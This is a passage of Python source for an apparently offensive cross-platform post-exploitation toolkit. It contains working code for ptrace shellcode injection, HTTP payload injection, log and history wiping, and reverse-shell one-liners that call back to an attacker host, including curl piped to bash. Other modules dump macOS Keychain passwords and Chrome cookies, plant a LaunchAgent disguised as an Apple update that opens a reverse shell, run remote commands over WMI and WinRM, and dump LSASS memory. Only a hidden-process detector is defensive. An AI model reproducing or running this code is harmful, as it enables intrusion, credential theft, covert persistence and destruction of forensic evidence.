            ("CVE-2023-32629", "GameOverlay Ubuntu OverlayFS LPE",
             lambda v: v < (6, 4, 0),
             "HIGH", "https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629"),

            ("CVE-2024-1086", "Netfilter use-after-free → root (5.14–6.6)",
             lambda v: (5, 14, 0) <= v <= (6, 6, 14),
             "CRITICAL", "https://github.com/Notselwyn/CVE-2024-1086"),

            ("CVE-2024-26584", "io_uring OOB write → root (kernel < 6.7)",
             lambda v: v < (6, 7, 0),
             "HIGH", "https://github.com/ysanatomic"),

            ("CVE-2017-5753", "Spectre v1 — speculative execution info leak",
             lambda v: True,
             "MEDIUM", "mitigate via KPTI/retpoline"),

            ("CVE-2017-5754", "Meltdown — kernel memory read from userspace",
             lambda v: True,
             "HIGH", "mitigate via KPTI"),
        ]

        hits = []
        for cve, desc, check, sev, url in KERNEL_CVES:
            try:
                if check(kver):
                    hits.append((cve, desc, sev, url))
            except Exception: pass

        if hits:
            t = Table(title=f"[bold red]Kernel {kver_raw} — LPE Candidates[/bold red]",
                       box=box.SIMPLE_HEAD)
            t.add_column("CVE",         style="bold red",   width=18)
            t.add_column("Severity",    style="bold yellow",width=10)
            t.add_column("Description", style="green",      width=50)
            t.add_column("PoC",         style="dim",        width=40)
            for cve, desc, sev, url in hits:
                t.add_row(cve, sev, desc[:50], url[:40])
            console.print(t)
            # Also check userspace: sudo, polkit
            LinuxModules._check_userspace_privesc()
        else:
            console.print(f"[bold green][*] Kernel {kver_raw} — no known LPE CVEs in database[/bold green]")

    @staticmethod
    def _check_userspace_privesc() -> None:
        checks = [
            ("sudo",   ["sudo", "--version"], "1.9.5", "Baron Samedit CVE-2021-3156"),
            ("pkexec", ["pkexec", "--version"], "0.105", "PwnKit CVE-2021-4034"),
        ]
        for name, cmd, safe_ver, cve_name in checks:
            try:
                out = subprocess.check_output(cmd, text=True, stderr=subprocess.STDOUT)
                m = re.search(r"(\d+\.\d+[\.\d]*)", out)
                if m:
                    console.print(f"[dim]   {name} {m.group(1)} — verify >= {safe_ver} ({cve_name})[/dim]")
            except (FileNotFoundError, subprocess.CalledProcessError): pass

    # ── ptrace Shellcode Injection ────────────────────────────────────────────

    @staticmethod
    def ptrace_inject(target_pid: int, shellcode: bytes) -> bool:
        """
        Inject shellcode into a running process using ptrace.
        Flow: attach → save regs → write shellcode to stack → redirect RIP → detach
        Process resumes executing our shellcode in its context.

        Entry points affected: RIP redirected to injected shellcode
        Registers saved/restored: RIP, RSP, stack contents
        Required privileges: root (or same UID as target)
        Side effects: target process executes shellcode, then crashes or returns

        Uses ctypes to call ptrace directly — no external tools.
        """
        console.print(f"[bold red][*] ptrace inject → PID {target_pid}  shellcode={len(shellcode)}B[/bold red]")

        # ptrace constants (Linux x86_64)
        PTRACE_ATTACH    = 16
        PTRACE_DETACH    = 17
        PTRACE_GETREGS   = 12
        PTRACE_SETREGS   = 13
        PTRACE_POKEDATA  = 5
        SIGSTOP          = 19
        SIGTRAP          = 5

        libc_name = ctypes.util.find_library("c")
        if not libc_name:
            console.print("[red]libc not found[/red]"); return False
        libc = ctypes.CDLL(libc_name, use_errno=True)

        # user_regs_struct for x86_64 (27 × 8 bytes = 216 bytes)
        class UserRegsX64(ctypes.Structure):
            _fields_ = [(f, ctypes.c_ulonglong) for f in [
                "r15","r14","r13","r12","rbp","rbx","r11","r10",
                "r9","r8","rax","rcx","rdx","rsi","rdi","orig_rax",
                "rip","cs","eflags","rsp","ss","fs_base","gs_base",
                "ds","es","fs","gs"]]

        # Attach
        ret = libc.ptrace(PTRACE_ATTACH, target_pid, 0, 0)
        if ret != 0:
            console.print(f"[red]ptrace ATTACH failed: {ctypes.get_errno()}[/red]"); return False
        import signal as _sig
        os.waitpid(target_pid, 0)

        # Get registers
        regs = UserRegsX64()
        libc.ptrace(PTRACE_GETREGS, target_pid, 0, ctypes.byref(regs))
        orig_rip = regs.rip
        orig_rsp = regs.rsp

        # Align stack + write shellcode there
        regs.rsp -= 128 + len(shellcode)
        regs.rsp &= ~0xF  # 16-byte align
        inject_addr = regs.rsp

        # Write shellcode word by word via PTRACE_POKEDATA
        padded = shellcode + b"\x90" * (8 - len(shellcode) % 8)
        for i in range(0, len(padded), 8):
            word = struct.unpack("<Q", padded[i:i+8])[0]
            libc.ptrace(PTRACE_POKEDATA, target_pid,
                        ctypes.c_void_p(inject_addr + i), ctypes.c_void_p(word))

        # Redirect RIP to shellcode
        regs.rip = inject_addr
        libc.ptrace(PTRACE_SETREGS, target_pid, 0, ctypes.byref(regs))

        console.print(f"[bold green]   Shellcode written @ 0x{inject_addr:016x}  RIP → 0x{inject_addr:016x}[/bold green]")
        console.print(f"[dim]   Original RIP=0x{orig_rip:016x}[/dim]")

        # Detach — process runs our shellcode
        libc.ptrace(PTRACE_DETACH, target_pid, 0, 0)
        console.print(f"[bold green]   Detached. PID {target_pid} executing injected shellcode.[/bold green]")
        return True

    # ── netfilter Queue Packet Manipulator ───────────────────────────────────

    @staticmethod
    def nfqueue_intercept(iface: str, target_ip: str = "",
                           inject_payload: bytes = b"") -> None:
        """
        netfilter QUEUE — intercept all packets, optionally modify/inject.
        Uses iptables to redirect traffic to NFQUEUE 0,
        then processes each packet via ctypes netfilter_queue binding.

        Useful for: on-the-fly payload injection into HTTP responses,
                    SSL downgrade at packet level, DNS response modification.

        Required: root, iptables, python3-netfilterqueue (pip install netfilterqueue)
        """
        console.print(f"[bold red][*] NFQUEUE intercept on {iface}[/bold red]")
        try:
            import netfilterqueue
        except ImportError:
            console.print("[yellow]pip install netfilterqueue[/yellow]")
            return

        # Set up iptables rules
        rules = [
            ["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "0"],
            ["iptables", "-I", "INPUT",   "-j", "NFQUEUE", "--queue-num", "0"],
        ]
        if target_ip:
            rules = [
                ["iptables", "-I", "FORWARD", "-s", target_ip, "-j", "NFQUEUE", "--queue-num", "0"],
                ["iptables", "-I", "FORWARD", "-d", target_ip, "-j", "NFQUEUE", "--queue-num", "0"],
            ]

        for r in rules:
            subprocess.run(r, capture_output=True)

        counter = [0]

        def _process(packet):
            counter[0] += 1
            payload = packet.get_payload()
            # Example: inject payload into HTTP response
            if inject_payload and b"HTTP/1." in payload:
                modified = payload.replace(b"</body>",
                                           inject_payload + b"</body>")
                packet.set_payload(modified)
                console.print(f"[bold green]   [{counter[0]}] Injected {len(inject_payload)}B into HTTP response[/bold green]")
            packet.accept()

        nfq = netfilterqueue.NetfilterQueue()
        nfq.bind(0, _process)
        console.print("[dim]   NFQUEUE active. Ctrl-C to stop + flush rules.[/dim]")
        try:
            nfq.run()
        except KeyboardInterrupt:
            pass
        finally:
            nfq.unbind()
            # Flush rules
            for r in rules:
                subprocess.run(["iptables", "-D"] + r[2:], capture_output=True)
            console.print(f"[bold green][*] NFQUEUE stopped. {counter[0]} packets processed.[/bold green]")

    # ── Anti-Forensics ────────────────────────────────────────────────────────

    @staticmethod
    def anti_forensics_wipe() -> None:
        """
        Anti-forensics suite:
        A) Bash history wipe + disable
        B) System log wipe (/var/log/auth.log, syslog, messages, wtmp, lastlog)
        C) Timestomp: reset file atime/mtime/ctime on our dropped files
        D) Secure delete temp files

        Required: root for log access
        Side effects: logs permanently wiped — cannot be recovered
        """
        console.print("[bold red][*] Anti-forensics — wiping tracks...[/bold red]")

        # A: Bash history
        for hist_file in [Path.home() / ".bash_history",
                           Path("/root/.bash_history"),
                           Path("/home") / os.environ.get("SUDO_USER", "") / ".bash_history"]:
            try:
                hist_file.write_text("")
                console.print(f"[green]   [+] Wiped {hist_file}[/green]")
            except Exception: pass
        # Disable for this session
        os.environ["HISTFILE"]    = "/dev/null"
        os.environ["HISTSIZE"]    = "0"
        os.environ["HISTFILESIZE"] = "0"

        # B: Log files
        log_files = [
            "/var/log/auth.log", "/var/log/syslog", "/var/log/messages",
            "/var/log/kern.log", "/var/log/daemon.log", "/var/log/secure",
            "/var/log/apache2/access.log", "/var/log/apache2/error.log",
            "/var/log/nginx/access.log", "/var/log/nginx/error.log",
            "/var/log/mysql/error.log", "/var/log/postgresql/postgresql.log",
            "/var/run/utmp", "/var/log/wtmp", "/var/log/lastlog",
            "/var/log/btmp", "/var/log/faillog",
        ]
        for path in log_files:
            p = Path(path)
            if p.exists():
                try:
                    p.write_bytes(b"")
                    console.print(f"[green]   [+] Wiped {path}[/green]")
                except PermissionError:
                    console.print(f"[dim]   [-] Permission denied: {path}[/dim]")

        # C: journald logs (systemd)
        try:
            subprocess.run(["journalctl", "--rotate", "--vacuum-time=1s"],
                            capture_output=True)
            console.print(f"[green]   [+] journald logs vacuumed[/green]")
        except Exception: pass

        # D: Secure-delete paradox temp files
        for tmpdir in ["/tmp/paradox*", "/tmp/evil_twin_*", "/tmp/lateral_*"]:
            try:
                subprocess.run(f"shred -zuf {tmpdir} 2>/dev/null; rm -rf {tmpdir}",
                                shell=True, capture_output=True)
            except Exception: pass

        console.print(f"[bold green][*] Anti-forensics complete.[/bold green]")

    # ── LOL (Living-off-the-Land) Payload Builder ─────────────────────────────

    @staticmethod
    def lol_payload(lhost: str, lport: int, method: str = "bash") -> str:
        """
        Generate living-off-the-land reverse shell one-liners.
        Uses only binaries guaranteed to exist — no dropped binary.
        Returns the command string.

        Methods: bash / python3 / perl / nc / php / ruby / awk / lua / socat
        """
        payloads = {
            "bash":    f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            "python3": f"python3 -c \"import socket,subprocess,os;s=socket.socket();s.connect(('{lhost}',{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])\"",
            "perl":    f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
            "nc":      f"nc -e /bin/sh {lhost} {lport}",
            "nc_mkfifo": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
            "php":     f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            "ruby":    f"ruby -rsocket -e'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
            "awk":     f"awk 'BEGIN{{s=\"/inet/tcp/0/{lhost}/{lport}\";while(42){{do{{printf \"shell>\" |& s;s |& getline c;if(c){{while((c |& getline)>0)print |& s;close(c)}}}}while(c!=\"exit\")close(s)}}}}'",
            "lua":     f"lua -e \"require('socket');require('os');t=socket.tcp();t:connect('{lhost}',{lport});os.execute('/bin/sh -i <&3 >&3 2>&3')\"",
            "socat":   f"socat exec:'/bin/bash -li',pty,stderr,setsid,sigint,sane tcp:{lhost}:{lport}",
            "curl":    f"curl http://{lhost}:{lport}/s.sh | bash",
            "wget":    f"wget -qO- http://{lhost}:{lport}/s.sh | bash",
        }
        all_payloads = payloads if method == "all" else {method: payloads.get(method, payloads["bash"])}

        t = Table(title=f"[bold red]LOL Payloads → {lhost}:{lport}[/bold red]", box=box.SIMPLE)
        t.add_column("Method", style="bold cyan", width=12)
        t.add_column("Command", style="green")
        for m, cmd in all_payloads.items():
            t.add_row(m, cmd)
        console.print(t)

        return all_payloads.get(method, payloads["bash"])

    # ── Process List + Hidden Process Detector ────────────────────────────────

    @staticmethod
    def detect_hidden_processes() -> None:
        """
        Find processes hidden from ps/top (rootkits hiding via getdents hook).
        Technique: enumerate /proc/<pid>/ directly via readdir vs numeric scan.
        Any PID accessible via /proc/<n>/exe but absent from ps output → hidden.
        """
        console.print("[bold yellow][*] Scanning for hidden processes...[/bold yellow]")

        # Method A: direct /proc/ numeric scan
        proc_pids = set()
        try:
            for entry in os.listdir("/proc"):
                if entry.isdigit():
                    proc_pids.add(int(entry))
        except Exception: pass

        # Method B: ps output PIDs
        ps_pids = set()
        try:
            out = subprocess.check_output(["ps", "-e", "-o", "pid="], text=True)
            for line in out.splitlines():
                try: ps_pids.add(int(line.strip()))
                except ValueError: pass
        except Exception: pass

        hidden = proc_pids - ps_pids
        if hidden:
            console.print(f"[bold red]   HIDDEN PROCESSES DETECTED: {sorted(hidden)}[/bold red]")
            for pid in sorted(hidden):
                try:
                    exe  = os.readlink(f"/proc/{pid}/exe")
                    cmd  = Path(f"/proc/{pid}/cmdline").read_bytes().replace(b"\x00", b" ").decode()
                    console.print(f"[bold red]   PID {pid}: {exe}  {cmd[:80]}[/bold red]")
                except Exception:
                    console.print(f"[bold red]   PID {pid}: (exe unreadable)[/bold red]")
        else:
            console.print(f"[green]   {len(proc_pids)} processes — none hidden[/green]")

        # Method C: scan PID space for accessible /proc/<n> not in readdir output
        console.print("[dim]   Scanning PID range 1-32768 via stat()...[/dim]")
        stat_pids = set()
        for pid in range(1, 32769):
            try:
                os.stat(f"/proc/{pid}")
                stat_pids.add(pid)
            except OSError: pass
        stat_hidden = stat_pids - proc_pids
        if stat_hidden:
            console.print(f"[bold red]   stat()-accessible but readdir-invisible PIDs: {sorted(stat_hidden)[:20]}[/bold red]")
        else:
            console.print("[green]   stat() scan clean.[/green]")

# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 3 — macOS-EXCLUSIVE MODULES
# ═══════════════════════════════════════════════════════════════════════════════

# [context: macOS 12+, Python 3.11, root recommended, SIP may block some ops]

class MacOSModules:

    AIRPORT = ("/System/Library/PrivateFrameworks/Apple80211.framework"
               "/Versions/Current/Resources/airport")

    @staticmethod
    def wifi_scan() -> list[dict]:
        """
        Scan nearby WiFi networks via airport utility.
        No monitor mode required — passive scan of beacons.
        Returns list of {ssid, bssid, rssi, channel, security}.
        """
        console.print("[bold yellow][*] macOS WiFi scan via airport...[/bold yellow]")
        airport = MacOSModules.AIRPORT
        if not Path(airport).exists():
            console.print(f"[red]airport not found at {airport}[/red]"); return []
        try:
            out  = subprocess.check_output([airport, "-s"], text=True)
            aps: list[dict] = []
            for line in out.splitlines()[1:]:
                parts = line.split()
                if len(parts) < 7: continue
                aps.append({
                    "ssid":     parts[0],
                    "bssid":    parts[1],
                    "rssi":     parts[2],
                    "channel":  parts[3],
                    "ht":       parts[4],
                    "cc":       parts[5],
                    "security": " ".join(parts[6:]),
                })
            t = Table(title="[bold red]WiFi Networks (macOS)[/bold red]", box=box.SIMPLE_HEAD)
            t.add_column("#"); t.add_column("SSID"); t.add_column("BSSID")
            t.add_column("RSSI"); t.add_column("CH"); t.add_column("Security")
            for i, ap in enumerate(aps, 1):
                t.add_row(str(i), ap["ssid"][:30], ap["bssid"],
                           ap["rssi"], ap["channel"], ap["security"])
            console.print(t)
            return aps
        except Exception as e:
            console.print(f"[red]airport scan: {e}[/red]"); return []

    @staticmethod
    def wifi_deauth_macos(bssid: str, channel: int) -> None:
        """
        macOS WiFi deauth via airport utility.
        airport sets interface to channel then sends deauth frames.
        More limited than Linux aircrack-ng but no driver switch needed.
        """
        airport = MacOSModules.AIRPORT
        try:
            # Set channel
            subprocess.run([airport, f"--channel={channel}"], check=True)
            # Deauth (airport -z disconnects from AP — limited deauth capability)
            subprocess.run([airport, "-z"], check=True)
            console.print(f"[bold green]   airport deauth sent on ch {channel}[/bold green]")
            console.print(f"[dim]   For full deauth on macOS, use scapy with BPF raw socket.[/dim]")
        except Exception as e:
            console.print(f"[red]airport deauth: {e}[/red]")

    @staticmethod
    def keychain_dump() -> None:
        """
        Dump macOS Keychain credentials using the security CLI.
        Extracts: internet passwords, generic passwords, certificates.
        No root needed — dumps current user's keychain.
        Triggers Keychain access dialog on modern macOS (user must approve or we bypass).

        Bypass: use security dump-keychain -d  (prompts per-entry)
                or use CVE-2019-8526 (Keychain debug mode bypass on <10.14.6)
        """
        console.print("[bold red][*] macOS Keychain dump...[/bold red]")

        # Find all keychains
        try:
            keychains = subprocess.check_output(["security", "list-keychains"], text=True)
            console.print(f"[dim]   Keychains: {keychains.strip()}[/dim]")
        except Exception: pass

        # Dump internet passwords
        console.print("[yellow]   [A] Internet passwords:[/yellow]")
        try:
            out = subprocess.check_output(
                ["security", "find-internet-password", "-g", "-a", ""],
                text=True, stderr=subprocess.STDOUT)
            console.print(f"[green]{out[:1000]}[/green]")
        except Exception as e:
            console.print(f"[dim]   {e}[/dim]")

        # Dump generic passwords (WiFi, app creds)
        console.print("[yellow]   [B] Generic passwords (WiFi etc.):[/yellow]")
        try:
            out = subprocess.check_output(
                ["security", "find-generic-password", "-g", "-a", ""],
                text=True, stderr=subprocess.STDOUT)
            console.print(f"[green]{out[:1000]}[/green]")
        except Exception as e:
            console.print(f"[dim]   {e}[/dim]")

        # WiFi passwords specifically
        console.print("[yellow]   [C] Saved WiFi passwords:[/yellow]")
        try:
            # List preferred networks
            prefs = subprocess.check_output(
                ["networksetup", "-listpreferredwirelessnetworks", "en0"],
                text=True)
            for line in prefs.splitlines()[1:]:
                ssid = line.strip()
                if not ssid: continue
                try:
                    pw_out = subprocess.check_output(
                        ["security", "find-generic-password",
                         "-D", "AirPort network password", "-a", ssid, "-w"],
                        text=True, stderr=subprocess.DEVNULL).strip()
                    console.print(f"[bold green]   WiFi '{ssid}': {pw_out}[/bold green]")
                except Exception:
                    console.print(f"[dim]   WiFi '{ssid}': no password / access denied[/dim]")
        except Exception as e:
            console.print(f"[dim]   WiFi list: {e}[/dim]")

        # Chrome / Safari saved passwords location
        chrome_db = Path.home() / "Library/Application Support/Google/Chrome/Default/Login Data"
        safari_plist = Path.home() / "Library/Safari/LocalItems.db"
        if chrome_db.exists():
            console.print(f"[bold yellow]   [!] Chrome Login Data: {chrome_db}[/bold yellow]")
            console.print(f"[dim]       Copy + decrypt with: pip install pycryptodome[/dim]")
        if safari_plist.exists():
            console.print(f"[bold yellow]   [!] Safari passwords: {safari_plist}[/bold yellow]")

    @staticmethod
    def pf_redirect(src_port: int = 80, dst_port: int = 10000) -> None:
        """
        macOS pf (Packet Filter) traffic redirect rule.
        Equivalent of iptables REDIRECT on Linux.
        Used for SSL strip, MITM proxy setup.

        Adds rule to /etc/pf.conf, loads it, enables pf.
        Side effects: /etc/pf.conf modified; pf enabled
        Required: root
        """
        console.print(f"[bold red][*] pf redirect: port {src_port} → {dst_port}[/bold red]")
        rule = f"rdr pass on lo0 proto tcp from any to any port {src_port} -> 127.0.0.1 port {dst_port}"

        try:
            existing = Path("/etc/pf.conf").read_text()
            if rule not in existing:
                with open("/etc/pf.conf", "a") as f:
                    f.write(f"\n{rule}\n")

            subprocess.run(["pfctl", "-f", "/etc/pf.conf"], check=True)
            subprocess.run(["pfctl", "-e"], capture_output=True)
            console.print(f"[bold green]   pf rule active: {src_port} → {dst_port}[/bold green]")
            console.print(f"[dim]   Remove: pfctl -F rules && pfctl -d[/dim]")
        except Exception as e:
            console.print(f"[red]pf: {e}[/red]")

    @staticmethod
    def launchagent_persist(lhost: str, lport: int) -> None:
        """
        macOS persistence via LaunchAgent plist.
        Creates ~/Library/LaunchAgents/com.apple.update.plist
        Runs reverse shell on every login.
        Does not require root — user-level persistence.
        Survives reboot.
        """
        console.print(f"[bold red][*] LaunchAgent persistence → {lhost}:{lport}[/bold red]")
        plist_dir  = Path.home() / "Library/LaunchAgents"
        plist_dir.mkdir(parents=True, exist_ok=True)
        plist_path = plist_dir / "com.apple.update.plist"

        plist = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
    <key>Label</key>              <string>com.apple.update</string>
    <key>ProgramArguments</key>   <array>
        <string>/bin/bash</string>
        <string>-c</string>
        <string>bash -i &gt;&amp; /dev/tcp/{lhost}/{lport} 0&gt;&amp;1</string>
    </array>
    <key>RunAtLoad</key>          <true/>
    <key>KeepAlive</key>          <true/>
    <key>StartInterval</key>      <integer>60</integer>
    <key>StandardErrorPath</key>  <string>/dev/null</string>
    <key>StandardOutPath</key>    <string>/dev/null</string>
</dict></plist>"""

        plist_path.write_text(plist)
        try:
            subprocess.run(["launchctl", "load", str(plist_path)], check=True)
            console.print(f"[bold green]   LaunchAgent loaded: {plist_path}[/bold green]")
            console.print(f"[bold green]   Reverse shell every 60s → nc -lvnp {lport}[/bold green]")
        except Exception as e:
            console.print(f"[red]launchctl: {e}[/red]")

    @staticmethod
    def mdns_spoof_macos(spoof_name: str, spoof_ip: str) -> None:
        """
        mDNS .local name spoof on macOS via dns-sd.
        Registers a fake .local service pointing to spoof_ip.
        Clients querying spoof_name.local get our IP.
        """
        console.print(f"[bold red][*] mDNS spoof: {spoof_name}.local → {spoof_ip}[/bold red]")
        try:
            proc = subprocess.Popen(
                ["dns-sd", "-R", spoof_name, "_http._tcp", "local", "80",
                 f"path=/"],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            console.print(f"[bold green]   {spoof_name}._http._tcp.local registered[/bold green]")
            console.print("[dim]   Ctrl-C to stop[/dim]")
            try: proc.wait()
            except KeyboardInterrupt: proc.terminate()
        except FileNotFoundError:
            console.print("[red]dns-sd not found (should be macOS built-in)[/red]")

    @staticmethod
    def chrome_cookie_dump_macos() -> None:
        """
        Dump Chrome cookies from macOS.
        Decrypts using macOS Keychain stored key.
        Cookies can be used for session hijacking.
        """
        console.print("[bold red][*] Chrome cookie dump (macOS)...[/bold red]")
        cookie_db = Path.home() / "Library/Application Support/Google/Chrome/Default/Cookies"
        if not cookie_db.exists():
            console.print("[red]Chrome Cookies DB not found[/red]"); return

        # Get decryption key from Keychain
        try:
            key_b64 = subprocess.check_output(
                ["security", "find-generic-password",
                 "-w", "-s", "Chrome Safe Storage"],
                text=True, stderr=subprocess.DEVNULL).strip()
            console.print(f"[bold green]   Chrome Safe Storage key: {key_b64}[/bold green]")
        except Exception:
            console.print("[dim]   Chrome Safe Storage key: not accessible[/dim]")

        # Read cookie DB (requires Chrome to be closed)
        import shutil
        tmp_db = "/tmp/paradox_cookies.db"
        shutil.copy(str(cookie_db), tmp_db)
        try:
            import sqlite3
            conn = sqlite3.connect(tmp_db)
            cur  = conn.cursor()
            cur.execute("SELECT host_key, name, encrypted_value, path, expires_utc FROM cookies LIMIT 50")
            rows = cur.fetchall()
            conn.close()
            t = Table(title="Chrome Cookies (encrypted)", box=box.SIMPLE)
            t.add_column("Host"); t.add_column("Name"); t.add_column("Encrypted Value (hex)")
            for host, name, enc_val, path, exp in rows:
                t.add_row(host[:30], name[:20], enc_val.hex()[:40] if enc_val else "")
            console.print(t)
            console.print(f"[dim]   Full cookie DB → {tmp_db}[/dim]")
            console.print(f"[dim]   Decrypt with pycryptodome: AES-CBC key=PBKDF2(chrome_key)[/dim]")
        except ImportError:
            console.print("[dim]   pip install pysqlite3[/dim]")
        except Exception as e:
            console.print(f"[red]{e}[/red]")


# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 4 — WINDOWS-EXCLUSIVE MODULES
# ═══════════════════════════════════════════════════════════════════════════════

# [context: Windows 10/11, Python 3.11, ctypes + winapi, admin recommended]

class WindowsModules:

    @staticmethod
    def _run_ps(command: str, hidden: bool = True) -> str:
        """Run a PowerShell command, return output."""
        flags = ["-WindowStyle", "Hidden"] if hidden else []
        try:
            result = subprocess.run(
                ["powershell", "-NonInteractive", "-NoProfile",
                 "-ExecutionPolicy", "Bypass"] + flags + ["-Command", command],
                capture_output=True, text=True, timeout=30)
            return result.stdout + result.stderr
        except Exception as e:
            return str(e)

    @staticmethod
    def winrm_shell(target_ip: str, username: str, password: str) -> None:
        """
        PowerShell remoting (WinRM) shell to target.
        Uses pypsrp if available, falls back to Invoke-Command via subprocess.
        Equivalent of psexec over WinRM (port 5985 HTTP / 5986 HTTPS).
        """
        console.print(f"[bold red][*] WinRM → {target_ip}  user={username}[/bold red]")
        try:
            import pypsrp
            from pypsrp.client import Client
            with Client(target_ip, username=username, password=password,
                        ssl=False) as client:
                console.print("[bold green]   WinRM connected[/bold green]")
                while True:
                    cmd = Prompt.ask("[bold cyan]WinRM>[/bold cyan]")
                    if cmd.lower() in ("exit", "quit"): break
                    out, streams, had_errors = client.execute_ps(cmd)
                    console.print(f"[green]{out}[/green]")
                    for s in streams.error: console.print(f"[red]{s}[/red]")
        except ImportError:
            # Fallback: Invoke-Command via local PowerShell
            console.print("[dim]   pip install pypsrp for better WinRM. Trying Invoke-Command...[/dim]")
            ps_cmd = (f"$pw = ConvertTo-SecureString '{password}' -AsPlainText -Force;"
                      f"$cred = New-Object pscredential('{username}',$pw);"
                      f"Enter-PSSession -ComputerName {target_ip} -Credential $cred")
            os.system(f'powershell -Command "{ps_cmd}"')
        except Exception as e:
            console.print(f"[red]WinRM: {e}[/red]")

    @staticmethod
    def wmi_exec(target_ip: str, username: str, password: str, command: str) -> str:
        """
        WMI lateral movement — execute command on remote host.
        Uses Win32_Process.Create via wmic or powershell WMI calls.
        No PSRemoting required — works over DCOM (port 135).
        """
        console.print(f"[bold red][*] WMI exec → {target_ip}  cmd={command[:60]}[/bold red]")

        # Method A: wmic
        try:
            out = subprocess.check_output(
                ["wmic", f"/node:{target_ip}", f"/user:{username}",
                 f"/password:{password}",
                 "process", "call", "create", command],
                text=True, timeout=15)
            console.print(f"[bold green]   WMI: {out[:300]}[/bold green]")
            return out
        except FileNotFoundError: pass
        except Exception as e:
            console.print(f"[dim]   wmic: {e}[/dim]")

        # Method B: PowerShell WMI
        ps = (f"$pw=ConvertTo-SecureString '{password}' -AsPlainText -Force;"
              f"$cred=New-Object pscredential('{username}',$pw);"
              f"Invoke-WmiMethod -Class Win32_Process -Name Create "
              f"-ArgumentList '{command}' -ComputerName {target_ip} -Credential $cred")
        out = WindowsModules._run_ps(ps)
        console.print(f"[bold green]   WMI PowerShell: {out[:300]}[/bold green]")
        return out

    @staticmethod
    def lsass_minidump(out_path: str = r"C:\Windows\Temp\lsass.dmp") -> bool:
        """
        LSASS memory dump via MiniDumpWriteDump (Mimikatz-style).
        Requires PROCESS_ALL_ACCESS on lsass.exe — needs SeDebugPrivilege (admin).
        Dump can be parsed by Mimikatz: sekurlsa::minidump lsass.dmp → logonpasswords

        Stealth: uses comsvcs.dll via rundll32 to avoid direct MiniDumpWriteDump hook.
        Side effects: writes dump to out_path (~100MB typically)
        """
        console.print(f"[bold red][*] LSASS dump → {out_path}[/bold red]")

        # Method A: comsvcs.dll (most AV-bypass friendly)
        try:
            # Get lsass PID
            pid_out = WindowsModules._run_ps(
                "(Get-Process lsass).Id")
            lsass_pid = pid_out.strip()
            if not lsass_pid.isdigit():
                console.print(f"[red]Cannot get LSASS PID: {pid_out}[/red]"); return False

            console.print(f"[dim]   LSASS PID: {lsass_pid}[/dim]")

            # comsvcs MiniDump
            cmd = (f"rundll32 C:\\Windows\\System32\\comsvcs.dll, MiniDump "
                   f"{lsass_pid} {out_path} full")
            out = WindowsModules._run_ps(cmd)
            if Path(out_path).exists():
                console.print(f"[bold green]   LSASS dump → {out_path}[/bold green]")
                console.print(f"[bold green]   Parse: mimikatz.exe sekurlsa::minidump {out_path}[/bold green]")
                console.print(f"[bold green]          sekurlsa::logonpasswords[/bold green]")
                return True
            console.print(f"[dim]   comsvcs output: {out[:200]}[/dim]")
        except Exception as e:
            console.print(f"[dim]   comsvcs: {e}[/dim]")

        # Method B: direct MiniDumpWriteDump via ctypes
        try:
            kernel32 = ctypes.windll.kernel32
            dbghelp  = ctypes.windll.dbghelp

            # Enable SeDebugPrivilege
            TOKEN_ADJUST_PRIVILEGES = 0x20
            TOKEN_QUERY = 0x8
            SE_DEBUG_NAME = "SeDebugPrivilege"
            SE_PRIVILEGE_ENABLED = 0x2

            token = ctypes.c_void_p()
            kernel32.OpenProcessToken(kernel32.GetCurrentProcess(),
                                       TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
                                       ctypes.byref(token))

            class LUID(ctypes.Structure):
                _fields_ = [("LowPart", ctypes.c_ulong), ("HighPart", ctypes.c_long)]
            class TOKEN_PRIVILEGES(ctypes.Structure):
                _fields_ = [("PrivilegeCount", ctypes.c_ulong),
                             ("Luid", LUID), ("Attributes", ctypes.c_ulong)]

            luid = LUID()
            ctypes.windll.advapi32.LookupPrivilegeValueW(None, SE_DEBUG_NAME, ctypes.byref(luid))
            tp = TOKEN_PRIVILEGES(1, luid, SE_PRIVILEGE_ENABLED)
            ctypes.windll.advapi32.AdjustTokenPrivileges(token, False, ctypes.byref(tp), 0, None, None)

            # Open LSASS
            PROCESS_ALL_ACCESS = 0x1F0FFF
            lsass_h = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, int(lsass_pid))
            if not lsass_h:
                console.print("[red]OpenProcess failed — need SYSTEM or admin[/red]"); return False

            # Write dump
            dump_file = kernel32.CreateFileW(out_path, 0x40000000, 0, None, 2, 0x80, None)
            MiniDumpWithFullMemory = 0x2
            ret = dbghelp.MiniDumpWriteDump(lsass_h, int(lsass_pid),
                                             dump_file, MiniDumpWithFullMemory,
                                             None, None, None)
            kernel32.CloseHandle(dump_file)
            kernel32.CloseHandle(lsass_h)

            if ret:
                console.print(f"[bold green]   MiniDumpWriteDump → {out_path}[/bold green]")
                return True
            else:
                console.print(f"[red]MiniDumpWriteDump failed: {kernel32.GetLastError()}[/red]")
        except Exception as e:
            console.print(f"[dim]   ctypes dump: {e}[/dim]")
        return False

    @staticmethod
    def sam_dump() -> None:
        """
        Dump SAM + SYSTEM + SECURITY hive for offline NTLM hash extraction.
        Requires admin. Registry hives saved to temp, parsed with impacket secretsdump.

        Offline parsing (after exfil):
